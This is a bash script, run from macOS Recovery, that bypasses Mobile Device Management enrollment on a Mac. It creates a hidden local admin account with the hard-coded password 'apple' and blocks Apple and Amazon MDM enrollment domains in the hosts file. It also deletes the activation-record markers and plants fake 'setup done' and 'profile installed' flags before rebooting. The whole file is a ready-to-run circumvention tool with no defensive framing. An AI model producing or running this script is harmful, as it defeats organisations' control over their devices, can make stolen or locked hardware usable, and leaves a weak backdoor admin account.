#!/bin/bash

# Define color codes
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

echo -e "${YEL}Bypass MDM from Recovery${NC}"

echo -e "${BLU}Fetching System Volume name"
system_volume=$(diskutil info / | grep  "Volume Name" | awk -F': ' '{print $2}' | xargs) # Returns something like: "Macintosh HD"
echo "${GRN}$system_volume"

if [ -d "/Volumes/$system_volume - Data" ]; then
    echo "${BLU}Renaming '$system_volume - Data' to 'Data'"
    diskutil rename "$system_volume - Data" "Data"
fi

echo -e "${BLU}Creating Temporary User"
dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
real_name="apple"
username="apple"
password="apple"
echo "${GRN}Password: $password"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$real_name"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "501"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
mkdir -p "/Volumes/Data/Users/$username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$password"
dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username"

echo "${BLU}Blocking MDM domains"
mdm_domains=( 
  "deviceenrollment.apple.com"  "mdmenrollment.apple.com"  "iprofiles.apple.com"  "gdmf.apple.com"  "acmdm.apple.com"
   "albert.apple.com"  "mdm.apple.com"  "mdmenroll.apple.com"  "mdmcheckin.apple.com"  "school.apple.com"
   "mdm.amazon.com"  "deviceenrollment.amazon.com"
)
for domain in "${mdm_domains[@]}"; do
  echo "0.0.0.0 $domain" >> /Volumes/"$system_volume"/etc/hosts
done
echo -e "${GRN}Successfully blocked MDM & Profile Domains"

echo "${BLU}Removing configuration profiles"
touch /Volumes/Data/private/var/db/.AppleSetupDone
rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound

echo -e "${GRN}MDM enrollment has been bypassed!${NC}"
echo -e "${NC}Rebooting your Mac...${NC}"

sleep 2
reboot
